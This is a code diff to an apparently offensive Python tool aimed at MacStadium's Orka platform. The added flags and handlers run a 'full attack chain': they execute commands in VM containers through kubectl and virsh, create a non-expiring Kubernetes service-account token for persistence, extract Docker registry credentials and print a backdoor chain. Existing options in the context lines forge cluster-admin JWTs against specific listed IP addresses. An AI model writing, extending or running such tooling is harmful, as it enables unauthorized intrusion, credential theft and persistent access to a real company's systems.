@@ -187,6 +187,21 @@ except ImportError:
     HAS_ORKA_OIDC = False
     orka_oidc_run = None
 
+try:
+    from orka_vm_exec_re import (
+        list_vms, probe_vm_exec_surface,
+        build_k8s_exec_cmd, exec_virsh_via_kubectl, build_virsh_chain,
+        create_service_account_token, create_persistent_sa,
+        list_registry_credentials, probe_harbor_api,
+        probe_api_surface, run_full_attack_chain,
+        VM_COMMANDS, VM_STATES, VIRSH_DOMAIN, ORKA_VM_CONTAINER,
+        BACKDOOR_CHAIN_DOC,
+    )
+    HAS_ORKA_VM_EXEC = True
+except ImportError:
+    HAS_ORKA_VM_EXEC = False
+    run_full_attack_chain = None
+
 
 MACSTADIUM_ASAS = [
     {'host': '207.254.35.12', 'port': 443, 'label': 'ASA-Primary'},
@@ -894,6 +909,12 @@ def main():
     parser.add_argument('--forge-masters', action='store_true', help='Forge system:masters JWT for K8s cluster-admin')
     parser.add_argument('--orka-k8s', metavar='PATH', default='/api/v1/namespaces', help='Probe K8s API at 10.221.188.19:6443 with forged token')
     parser.add_argument('--oidc-discovery', action='store_true', help='Probe idp.macstadium.com OIDC discovery paths')
+    # orka_vm_exec_re flags
+    parser.add_argument('--orka-vm-exec', action='store_true', help='Orka3 VM execution RE: confirmed K8s pod exec path (orka-vm container)')
+    parser.add_argument('--orka-sa-token', action='store_true', help='Create persistent K8s SA token (expirationSeconds: null)')
+    parser.add_argument('--orka-regcreds', action='store_true', help='Extract Docker registry credentials from Orka API')
+    parser.add_argument('--orka-virsh-chain', metavar='POD', help='Run virsh probe chain against orka-vm container in POD')
+    parser.add_argument('--orka-attack-chain', action='store_true', help='Full Orka attack chain: enum + exec + SA token + regcreds')
 
     args = parser.parse_args()
     
@@ -1309,6 +1330,65 @@ def main():
         else:
             print("[*] Probing idp.macstadium.com OIDC discovery...")
             result = probe_oidc_discovery()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_vm_exec', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            print("[*] Orka3 VM exec RE findings (confirmed from binary disassembly)")
+            print(f"    Exec path: K8s pod exec API — /api/v1/namespaces/{{ns}}/pods/{{pod}}/exec")
+            print(f"    Container: {ORKA_VM_CONTAINER}")
+            print(f"    virsh domain: {VIRSH_DOMAIN}")
+            print(f"    VMCommand keys: {list(VM_COMMANDS.keys())}")
+            print()
+            print("VMCommand map (from map.init.0 @ 0x1c707a0):")
+            for cmd, meta in VM_COMMANDS.items():
+                print(f"  {cmd!r:10s} virshState={meta['virsh_state']!r:10s} "
+                      f"success={meta['success']!r}")
+            print()
+            print("Confirmed exec kubectl equivalent:")
+            print(f"  kubectl exec <pod> -c {ORKA_VM_CONTAINER} -n orka-default -- virsh list --all")
+            print(f"  kubectl exec <pod> -c {ORKA_VM_CONTAINER} -n orka-default -- virsh domstate {VIRSH_DOMAIN}")
+
+    elif getattr(args, 'orka_sa_token', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            print("[*] Requesting non-expiring K8s SA token (expirationSeconds: null)...")
+            print("    Fill ADMIN_TOKEN in orka_vm_exec_re.py before running")
+            result = create_service_account_token('default', no_expiry=True)
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_regcreds', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            print("[*] Extracting Docker registry credentials from Orka API...")
+            result = list_registry_credentials()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_virsh_chain', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            pod = args.orka_virsh_chain
+            print(f"[*] Running virsh probe chain against pod {pod!r} container {ORKA_VM_CONTAINER!r}")
+            result = build_virsh_chain(pod)
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_attack_chain', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            print("[*] Full Orka attack chain (fill ADMIN_TOKEN in orka_vm_exec_re.py)")
+            print(BACKDOOR_CHAIN_DOC)
+            result = run_full_attack_chain()
             print(json.dumps(result, indent=2, default=str))
 
     elif args.containers:
